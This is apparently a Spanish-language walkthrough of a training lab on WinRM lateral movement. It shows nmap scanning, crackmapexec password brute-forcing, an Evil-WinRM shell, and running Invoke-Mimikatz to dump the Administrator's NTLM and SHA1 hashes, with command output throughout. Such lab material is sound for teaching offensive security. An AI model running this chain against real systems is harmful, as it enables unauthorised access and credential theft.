
# WinRM Lateral Movement

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Evil-WinRM Invoke-PS-Script**</mark>

Se le proporciona una máquina Kali GUI y una máquina de destino que ejecuta un servidor WinRM. Puede acceder a la máquina de destino en **demo.ine.local** .

Tu tarea consiste en identificar el servicio WinRM utilizando las herramientas disponibles en la máquina Kali. A continuación, usa el archivo \[<https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1>] en el servidor remoto para extraer información confidencial, como hashes de usuarios de Windows, secretos LSA, etc.

Para acceder al servicio, puede utilizar el siguiente nombre de usuario y contraseña:

```
- Usuario: administrator
- Contraseña: rocknroll_123321
```

**Objetivo**: Explotar el servicio WinRM, cargar el archivo `Invoke-Mimikatz.ps1` en el servidor remoto y extraer el hash del usuario administrador.

#### Hosts

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.7        attackdefense.com attackdefense
10.10.37.5      attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.2.22.240    demo.ine.local
```

### Escaneo de puertos (WinRM)

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV -p 5985 demo.ine.local                                                                                                                  

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Bruteforce

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec winrm 10.2.22.240 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

En nuestro caso ya tenemos la contraseña que nos da el lab: `rocknroll_123321`

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec winrm 10.2.22.240 -u administrator -p 'rocknroll_123321'

SMB         10.2.22.240     5985   WIN-OMCNBKR66MN  [*] Windows 8.1 / Server 2012 R2 Build 9600 (name:WIN-OMCNBKR66MN) (domain:WIN-OMCNBKR66MN)
HTTP        10.2.22.240     5985   WIN-OMCNBKR66MN  [*] http://10.2.22.240:5985/wsman
WINRM       10.2.22.240     5985   WIN-OMCNBKR66MN  [+] WIN-OMCNBKR66MN\administrator:rocknroll_123321 (Pwn3d!)
```

### Ejecución de comandos

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec winrm 10.2.22.240 -u administrator -p 'rocknroll_123321' -X 'whoami'                                                                  

SMB         10.2.22.240     5985   WIN-OMCNBKR66MN  [*] Windows 8.1 / Server 2012 R2 Build 9600 (name:WIN-OMCNBKR66MN) (domain:WIN-OMCNBKR66MN)
HTTP        10.2.22.240     5985   WIN-OMCNBKR66MN  [*] http://10.2.22.240:5985/wsman
WINRM       10.2.22.240     5985   WIN-OMCNBKR66MN  [+] WIN-OMCNBKR66MN\administrator:rocknroll_123321 (Pwn3d!)
WINRM       10.2.22.240     5985   WIN-OMCNBKR66MN  [+] Executed command
WINRM       10.2.22.240     5985   WIN-OMCNBKR66MN  win-omcnbkr66mn\administrator
```

### Conexión por Evil WinRM

```bash
┌──(root㉿attackdefense)-[~]
└─# evil-winrm -u administrator -p 'rocknroll_123321' -i 10.2.22.240                                                                                   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
win-omcnbkr66mn\administrator
```

### Cargar Invoke-Mimikatz.ps1

```bash
┌──(root㉿attackdefense)-[~/Desktop/tools/scripts]
└─# ls                                                                                                                                                 
Invoke-Mimikatz.ps1  memcache
```

Podemos cargar una ruta al ejecutar Evil WinRM para ejecutar scripts que tengamos en local añadiendo la siguiente línea:

```
-s /root/Desktop/tools/scripts/
```

```bash
┌──(root㉿attackdefense)-[~/Desktop/tools/scripts]
└─# evil-winrm -u administrator -p 'rocknroll_123321' -i 10.2.22.240 -s /root/Desktop/tools/scripts/
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
```

#### Ejecutar Invoke-Mimikatz

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'

Hostname: WIN-OMCNBKR66MN / S-1-5-21-2563855374-3215282501-1490390052

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 292322 (00000000:000475e2)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : WIN-OMCNBKR66MN
Logon Server      : WIN-OMCNBKR66MN
Logon Time        : 4/13/2026 4:35:22 PM
SID               : S-1-5-21-2563855374-3215282501-1490390052-500
        msv :
         [00010000] CredentialKeys
         * NTLM     : 7ff3c58fce728b60f1ff8718c4e9ca67
         * SHA1     : 78ac4b57f900c1589c7d79bc54bcfd1e7859b381
         [00000003] Primary
         * Username : Administrator
         * Domain   : WIN-OMCNBKR66MN
         * NTLM     : 7ff3c58fce728b60f1ff8718c4e9ca67
         * SHA1     : 78ac4b57f900c1589c7d79bc54bcfd1e7859b381
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WIN-OMCNBKR66MN
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : WIN-OMCNBKR66MN
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 279980 (00000000:000445ac)
```

### Powershell Remoting

#### Obtener variable cred

```bash
┌──(root㉿attackdefense)-[~]
└─# pwsh 
```

```bash
┌──(root㉿attackdefense)-[/root/Desktop/tools/scripts]
└─PS> $cred = Get-Credential                                                                                                                           

PowerShell credential request
Enter your credentials.                                                                                                                                
User: administrator
Password for user administrator: rocknroll_123321
```

```bash
┌──(root㉿attackdefense)-[/root/Desktop/tools/scripts]
└─PS> $cred                                                                                                                                            

UserName                          Password
--------                          --------
administrator System.Security.SecureString
```

#### Habilitar PS-Remoting en el objetivo

```powershell
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Enable-PSRemoting

WinRM Quick Configuration
Running command "Set-WSManQuickConfig" to enable remote management of this computer by using the Windows Remote
Management (WinRM) service.
 This includes:
    1. Starting or restarting (if already started) the WinRM service
    2. Setting the WinRM service startup type to Automatic
    3. Creating a listener to accept requests on any IP address
    4. Enabling Windows Firewall inbound rule exceptions for WS-Management traffic (for http only).

Do you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): Y
WinRM is already set up to receive requests on this computer.
WinRM is already set up for remote management on this computer.
```

#### Ejecutar Enter-PSSession desde PWSH

```
┌──(root㉿attackdefense)-[/root]
└─PS> Enter-PSSession -ComputerName 10.2.22.240 -Authentication Negotiate -Credential $cred
```
